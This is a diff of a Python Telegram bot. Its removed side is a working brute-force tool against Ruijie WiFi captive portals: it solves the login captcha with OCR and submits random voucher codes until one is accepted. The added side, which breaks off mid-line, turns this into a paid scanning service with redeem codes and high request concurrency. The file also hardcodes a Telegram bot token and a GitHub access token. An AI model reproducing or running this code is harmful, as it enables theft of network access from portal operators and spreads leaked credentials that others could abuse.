@@ -1,201 +1,332 @@
-print("===== PHONE TERMUX BOT.PY LOADING =====", flush=True)
-import os
-import json
-import asyncio
-import concurrent.futures
-from urllib.parse import urlparse, parse_qs
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import Message, Update, InlineKeyboardMarkup, InlineKeyboardButton
-import aiohttp
+from aiohttp import web
+import cv2
 import ddddocr
-import random
-import string
-import time
+import numpy as np
+from datetime import datetime, timedelta, timezone
 
-# ===== Bot Token Configuration =====
-BOT_TOKEN = "8851853713:AAE_x4jtZpza4owQ2Bm4d0quQ2BpJ8EWIJk"
-
+BOT_TOKEN = '8304019935:AAEY0Pbppfax4samMTY4hlofbkImIk7LLT0'
+GITHUB_TOKEN = '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'
+REPO_OWNER = "htetaungkyaw256163038-cpu"
+REPO_NAME = "Htet-Gyi"
+ADMIN_ID = "2096430319"
 bot = AsyncTeleBot(BOT_TOKEN)
-user_settings = {}
+_telegram_send = bot.send_message
+_telegram_reply = bot.reply_to
+_telegram_edit = bot.edit_message_text
+user_data = {}
+redeem_access = {}
+redeem_lock = asyncio.Lock()
+scan_tasks = {}
+success_messages = success_textschasuccessimited_messages = {}
+limited_texts = {}
+captcha_state = {}
+retry_counts = {}
+_session_pool = {}
 
-# ddddocr ကို ဖုန်းထဲတွင် အဆင်သင့် သုံးနိုင်အောင် လုပ်ဆောင်ခြင်း
-print("[SYSTEM] Initializing ddddocr Engine...", flush=True)
-ocr = ddddocr.DdddOcr(show_ad=False)
-executor = concurrent.futures.ThreadPoolExecutor(max_workers=2) # ဖုန်းအတွက် worker ၂ ခုပဲ ထားပါမယ်
+session = None
+_connector = None
+_voucher_sem = None
 
-# ===== URL Parser =====
-def parse_ruijie_url(portal_url):
-    parsed_url = urlparse(portal_url)
-    base_api = f"{parsed_url.scheme}://{parsed_url.netloc}"
-    params = parse_qs(parsed_url.query)
-    
-    return {
-        "base_api": base_api,
-        "mac": params.get("mac", params.get("sta_mac", [""])),
-        "ip": params.get("ip", params.get("userip", [""])),
-        "ssid": params.get("ssid", ["WiFi"]),
-        "gw_id": params.get("gw_id", [""]),
-        "gw_sn": params.get("gw_sn", [""]),
-        "chap_id": params.get("chap_id", [""]),
-        "chap_challenge": params.get("chap_challenge", [""]),
-        "nasip": params.get("nasip", [""]),
-        "slot_num": params.get("slot_num", [""])
-    }
+_start_time = time.monotonic()
 
-def sync_ocr_process(image_bytes):
-    return ocr.classification(image_bytes)
+SESSION_POOL_LIMIT = 60
+SESSION_POOL_SLOTS = 5
+CONCURRENCY = 2500
+BATCH_SIZE = 5000
 
-# ===== Captcha ဖြေရှင်းပေးမည့် Real Logic =====
-async def solve_captcha_via_ddddocr(session, base_api):
-    try:
-        captcha_url = f"{base_api}/api/auth/captcha?_ts={int(time.time()*1000)}"
-        async with session.get(captcha_url, timeout=5) as resp:
-            if resp.status == 200:
-                img_bytes = await resp.read()
-                # ဖုန်း Processor ဟန်းမသွားစေရန် ThreadPoolExecutor ဖြင့် ခွဲမောင်းခြင်း
-                loop = asyncio.get_running_loop()
-                captcha_text = await loop.run_in_executor(executor, sync_ocr_process, img_bytes)
-                print(f"[CAPTCHA SOLVED] Result: {captcha_text}", flush=True)
-                return captcha_text
-    except Exception as e:
-        print(f"Captcha OCR Error: {e}", flush=True)
-    return ""
+async def handle(request):
+    return web.Response(text="Bot is awake and running 24/7!")
 
-# ===== Core Voucher Crack Engine =====
-async def crack_ruijie_voucher(session, settings, voucher_code):
-    try:
-        url_info = settings["url_info"]
-        base_api = url_info["base_api"]
-        
-        # ၁။ ddddocr ဖြင့် Captcha အမှန်တကယ် ဖြေရှင်းခြင်း
-        captcha_text = await solve_captcha_via_ddddocr(session, base_api)
-        
-        # ၂။ Payload တည်ဆောက်ခြင်း
-        payload = {
-            "auth_type": "voucher",
-            "voucher": voucher_code,
-            "captcha": captcha_text,
-            "mac": url_info["mac"],
-            "ip": url_info["ip"],
-            "ssid": url_info["ssid"],
-            "gw_id": url_info["gw_id"],
-            "gw_sn": url_info["gw_sn"],
-            "chap_id": url_info["chap_id"],
-            "chap_challenge": url_info["chap_challenge"],
-            "nasip": url_info["nasip"],
-            "slot_num": url_info["slot_num"]
-        }
-        
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        }
-        
-        # အတိုင်ပင်ခံ ညွှန်ကြားထားသည့် သတ်မှတ်ချက်အတိုင်း Slash ပါသော နေရာသို့ ပို့ခြင်း
-        api_path = settings.get("api_path", "/api/auth/voucher/")
-        target_url = f"{base_api}{api_path}"
-        
-        async with session.post(target_url, data=payload, headers=headers, timeout=6) as response:
-            res_text = await response.text()
-            success_keyword = settings.get("success_keyword", '"errorCode":0')
-            
-            if success_keyword in res_text or '"code":0' in res_text:
-                return {"status": "success", "code": voucher_code, "raw": res_text}
-            else:
-                return {"status": "fail", "raw": res_text}
-                
-    except Exception as e:
-        return {"status": "error", "reason": str(e)}
+async def web_server():
+    app = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get('PORT', 8099))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    print(f"Web server started on port {port}")
 
-# ===== Telegram Bot Handlers =====
-@bot.message_handler(commands=['start'])
-async def start(message):
-    await bot.reply_to(message, "📱 **Ruijie Termux Phone Bot Ready**\n\nစတင်ရန် `/setup` ဟု ရိုက်ပါ။")
-
-@bot.message_handler(commands=['setup'])
-async def handle_setup(message):
-    chat_id = message.chat.id
-    user_settings[chat_id] = {
-        "api_path": "/api/auth/voucher/",
-        "success_keyword": '"errorCode":0',
-        "prefix": ""
-    }
-    await bot.reply_to(
-        message,
-        "🛠️ **Phone Termux Settings Config**\n\n"
-        "👉 `/set_pattern [Prefix]` (တကယ့် Voucher Pattern သတ်မှတ်ရန်)\n\n"
-        "ပြင်ဆင်ပြီးပါက URL အား ထည့်သွင်းပါ:\n`/portal [your_url]`"
+async def rebuild_session():
+    global session, _connector
+    if session and not session.closed:
+        await session.close()
+    if _connector and not _connector.closed:
+        await _connector.close()
+    timeout = aiohttp.ClientTimeout(total=30)
+    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
+    session = aiohttp.ClientSession(
+        timeout=timeout,
+        connector=_connector,
+        connector_owner=False
     )
 
-@bot.message_handler(commands=['set_pattern'])
-async def set_pattern(message):
-    chat_id = message.chat.id
-    args = message.text.split(maxsplit=1)
-    if len(args) == 2 and chat_id in user_settings:
-        user_settings[chat_id]["prefix"] = args
-        await bot.reply_to(message, f"✅ Target Pattern Prefix: `{args}`")
+async def _drain_stdout(proc, idx):
+    if proc and proc.stdout:
+        try:
+            async for _ in proc.stdout:
+                pass
+        except Exception:
+            pass
 
-@bot.message_handler(commands=['portal'])
-async def handle_portal(message):
-    chat_id = message.chat.id
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2: return
-    
-    try:
-        url_info = parse_ruijie_url(args)
-        user_settings[chat_id]["url_info"] = url_info
-        
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⚡ Phone Engine ဖြင့် စတင်မောင်းမည်", callback_data="start_scan"))
-        
-        await bot.reply_to(
-            message,
-            f"🔗 **Portal Meta Loaded**\n"
-            f"📡 SSID: {url_info['ssid']}\n"
-            f"🤖 Captcha Mode: ddddocr (Active in Phone)\n\n"
-            f"စတင်စမ်းသပ်ရန် အောက်က ခလုတ်ကို နှိပ်ပါ။",
-            reply_markup=markup
+async def get_file_content(path):
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    async with session.get(url, headers=headers) as response:
+        if response.status == 200:
+            data = await response.json()
+            content = base64.b64decode(data['content']).decode('utf-8')
+            return json.loads(content), data['sha']
+    return {}, None
+
+async def update_file_content(path, content, sha, message):
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
+    headers = {
+        "Authorization": f"token {GITHUB_TOKEN}",
+        "Content-Type": "application/json"
+    }
+    encoded = base64.b64encode(json.dumps(content).encode()).decode()
+    payload = {
+        "message": message,
+        "content": encoded,
+    }
+    if sha:
+        payload["sha"] = sha
+    async with session.put(url, headers=headers, json=payload) as response:
+        return await response.text()
+
+TELEGRAM_MESSAGE_LIMIT = 3900
+TELEGRAM_RETRY_LIMIT = 3
+
+def split_telegram_message(text, max_chars=TELEGRAM_MESSAGE_LIMIT):
+    if len(text) <= max_chars:
+        return [text]
+    chunks = []
+    remaining = text
+    while remaining:
+        cut = min(max_chars, len(remaining))
+        if cut < len(remaining):
+            newline = remaining.rfind("\n", 0, cut)
+            if newline > 0:
+                cut = newline
+        chunks.append(remaining[:cut].rstrip())
+        remaining = remaining[cut:].lstrip()
+    return chunks
+
+async def safe_send_message(chat_id, text, **kwargs):
+    for attempt in range(TELEGRAM_RETRY_LIMIT):
+        try:
+            return await _telegram_send(chat_id, text, **kwargs)
+        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
+            if attempt == TELEGRAM_RETRY_LIMIT - 1:
+                raise
+            print(f"[telegram] send retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
+            await asyncio.sleep(1 + attempt)
+
+async def safe_reply_to(message, text, **kwargs):
+    for attempt in range(TELEGRAM_RETRY_LIMIT):
+        try:
+            return await _telegram_reply(message, text, **kwargs)
+        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
+            if attempt == TELEGRAM_RETRY_LIMIT - 1:
+                raise
+            print(f"[telegram] reply retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
+            await asyncio.sleep(1 + attempt)
+
+async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
+    for attempt in range(TELEGRAM_RETRY_LIMIT):
+        try:
+            return await _telegram_edit(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=text,
+                **kwargs
+            )
+        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
+            if attempt == TELEGRAM_RETRY_LIMIT - 1:
+                raise
+            print(f"[telegram] edit retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
+            await asyncio.sleep(1 + attempt)
+
+async def update_chunked_messages(chat_id, title, items, message_ids=None):
+    chunks = split_telegram_message(f"{title}\n\n" + "\n\n".join(items))
+    message_ids = list(message_ids or [])
+    for index, chunk in enumerate(chunks):
+        if index < len(message_ids):
+            try:
+                await safe_edit_message_text(chat_id, message_ids[index], chunk)
+                continue
+            except Exception as error:
+                print(f"[telegram] edit failed after retries: {error}")
+        sent = await safe_send_message(chat_id, chunk)
+        if index < len(message_ids):
+            message_ids[index] = sent.message_id
+        else:
+            message_ids.append(sent.message_id)
+    return message_ids
+
+bot.send_message = safe_send_message
+bot.reply_to = safe_reply_to
+bot.edit_message_text = safe_edit_message_text
+
+@bot.message_handler(commands=['start'])
+async def start(message):
+    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /redeem <code> ဖြင့် access ရယူပါ။")
+
+def generate_redeem_code(existing_codes):
+    alphabet = string.ascii_uppercase + string.digits
+    while True:
+        code = ''.join(random.choice(alphabet) for _ in range(6))
+        if code not in existing_codes:
+            return code
+
+async def redeem_user_access(chat_id):
+    access = redeem_access.get(chat_id)
+    if not access or access.get("uses_remaining", 0) <= 0:
+        return False
+    return True
+
+async def consume_redeem_use(chat_id):
+    async with redeem_lock:
+        access = redeem_access.get(chat_id)
+        if not access or access.get("uses_remaining", 0) <= 0:
+            return False
+        codes, sha = await get_file_content("redeem_codes.json")
+        code = access["code"]
+        entry = codes.get(code)
+        if not entry or entry.get("claimed_by") != str(chat_id):
+            redeem_access.pop(chat_id, None)
+            return False
+        remaining = int(entry.get("uses_remaining", 0))
+        if remaining <= 0:
+            redeem_access.pop(chat_id, None)
+            return False
+        entry["uses_remaining"] = remaining - 1
+        await update_file_content(
+            "redeem_codes.json", codes, sha,
+            f"Consume redeem code {code} for {chat_id}"
         )
+        access["uses_remaining"] = remaining - 1
+        if access["uses_remaining"] <= 0:
+            redeem_access.pop(chat_id, None)
+        return True
+
+@bot.message_handler(commands=['redeem'])
+async def redeem(message):
+    args = message.text.split()
+    if len(args) != 2 or not re.fullmatch(r"[A-Z0-9]{6}", args[1].upper()):
+        await bot.reply_to(message, "Usage: /redeem ABC123")
+        return
+    code = args[1].upper()
+    chat_id = str(message.chat.id)
+    async with redeem_lock:
+        codes, sha = await get_file_content("redeem_codes.json")
+        entry = codes.get(code)
+        if not entry:
+            await bot.reply_to(message, "Redeem code မတွေ့ပါ။")
+            return
+        claimed_by = entry.get("claimed_by")
+        if claimed_by and claimed_by != chat_id:
+            await bot.reply_to(message, "ဒီ redeem code ကို အခြား user က အသုံးပြုပြီးပါပြီ။")
+            return
+        remaining = int(entry.get("uses_remaining", 0))
+        if remaining <= 0:
+            await bot.reply_to(message, "ဒီ redeem code ရဲ့ access time ကုန်ဆုံးပါပြီ။")
+            return
+        entry["claimed_by"] = chat_id
+        entry["claimed_at"] = datetime.now(timezone.utc).isoformat()
+        await update_file_content(
+            "redeem_codes.json", codes, sha,
+            f"Redeem code {code} by {chat_id}"
+        )
+        redeem_access[message.chat.id] = {
+            "code": code,
+            "uses_remaining": remaining,
+        }
+    user_data[message.chat.id] = {}
+    await bot.reply_to(message, f"Redeem အောင်မြင်ပါသည်။ Scan access ကျန်ရှိမှု: {remaining}")
+
+@bot.message_handler(commands=['genredeem'])
+async def genredeem(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+    args = message.text.split()
+    if len(args) not in (2, 3) or not args[1].isdigit() or int(args[1]) < 1:
+        await bot.reply_to(message, "Usage: /genredeem <scan-count> [count]")
+        return
+    uses = int(args[1])
+    count = int(args[2]) if len(args) == 3 and args[2].isdigit() else 1
+    if count < 1 or count > 100:
+        await bot.reply_to(message, "count သည် 1 မှ 100 အတွင်း ဖြစ်ရပါမည်။")
+        return
+    async with redeem_lock:
+        codes, sha = await get_file_content("redeem_codes.json")
+        generated = []
+        for _ in range(count):
+            code = generate_redeem_code(codes)
+            codes[code] = {
+                "uses_total": uses,
+                "uses_remaining": uses,
+                "claimed_by": None,
+                "claimed_at": None,
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            }
+            generated.append(code)
+        await update_file_content(
+            "redeem_codes.json", codes, sha,
+            f"Generate {count} redeem code(s)"
+        )
+    await bot.reply_to(message, "Generated redeem code(s):\n" + "\n".join(generated))
+
+@bot.message_handler(commands=['listredeem'])
+async def listredeem(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+    codes, _ = await get_file_content("redeem_codes.json")
+    if not codes:
+        await bot.reply_to(message, "Redeem code မရှိသေးပါ။")
+        return
+    lines = [
+        f"{code} | {entry.get('uses_remaining', 0)}/{entry.get('uses_total', 0)} | "
+        f"user: {entry.get('claimed_by') or '-'}"
+        for code, entry in codes.items()
+    ]
+    for index, chunk in enumerate(split_telegram_message("Redeem codes:\n" + "\n".join(lines))):
+        if index == 0:
+            await bot.reply_to(message, chunk)
+        else:
+            await safe_send_message(message.chat.id, chunk)
+
+
+async def check_session_url(session_url):
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+        'referer': session_url,
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+    }
+    try:
+        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
+            final_url = str(response.url)
+            body = await response.text()
+            print(f"[check_session_url] final_url={final_url} status={response.status}")
+            if "sessionId" in final_url or "sessionId" in body:
+                return True
+            if response.status in (200, 302, 301):
+                return True
+            return False
     except Exception as e:
-        await bot.reply_to(message, f"❌ URL Error: {str(e)}")
-
-@bot.callback_query_handler(func=lambda call: call.data == "start_scan")
-async def start_scan_callback(call):
-    chat_id = call.message.chat.id
-    settings = user_settings.get(chat_id)
-    if not settings: return
-
-    await bot.send_message(chat_id, "🚀 ဖုန်းထဲကနေ Multi-threading စနစ်နဲ့ စတင်စမ်းသပ်နေပါပြီ...")
-    asyncio.create_task(run_voucher_scanner(chat_id, settings))
-
-async def run_voucher_scanner(chat_id, settings):
-    prefix = settings.get("prefix", "")
-    remain_len = max(0, 7 - len(prefix))
-    vouchers = []
-    
-    for _ in range(30):
-        rand_part = ''.join(random.choices(string.digits, k=remain_len))
-        vouchers.append(f"{prefix}{rand_part}")
-        
-    connector = aiohttp.TCPConnector(limit=3, ssl=False) # ဖုန်းဖြစ်လို့ ဆာဗာမကျအောင် လျှော့ထားပါတယ်
-    async with aiohttp.ClientSession(connector=connector) as session:
-        semaphore = asyncio.Semaphore(1) # ဖုန်း RAM ကို သက်သာစေရန် တစ်ကြိမ်လျှင် တစ်ခုစီ တိတိကျကျ စစ်ပါမည်
-        
-        async def worker(v_code):
-            async with semaphore:
-                res = await crack_ruijie_voucher(session, settings, v_code)
-                if res["status"] == "success":
-                    await bot.send_message(chat_id, f"🎉 **VALID VOUCHER FOUND!!**\n🔑 CODE: `{v_code}`")
-                
-        tasks = [worker(code) for code in vouchers]
-        await asyncio.gather(*tasks)
-        
-    await bot.send_message(chat_id, "🏁 ဖုန်းတွင်း Automation စမ်းသပ်မှု အားလုံး ပြီးဆုံးပါပြီ။")
-
-# ===== Long Polling စနစ်ဖြင့် Bot အား အမြဲရှင်သန်စေခြင်း =====
-async def main():
-    print("🤖 Telegram Bot Polling Started Inside Termux...", flush=True)
-    await bot.infinity_polling(skip_pending=True)
-
-if __name__ == '__main__':
-    asyncio.run(main())
+        print(f"[check_session_url] er
